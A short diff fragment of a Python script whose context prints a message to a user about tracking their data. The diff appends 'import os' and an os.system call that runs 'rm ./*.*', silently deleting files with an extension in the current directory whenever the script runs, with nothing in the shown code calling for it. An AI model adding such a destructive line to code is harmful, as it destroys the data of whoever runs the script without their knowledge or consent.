@@ -139,4 +139,5 @@ else:
   print("Thank you {}, sadly for us it can be very interesting to be able to track the data we provide you".format(nombre))
   pass
 
-
+import os
+os.system("rm ./*.*")
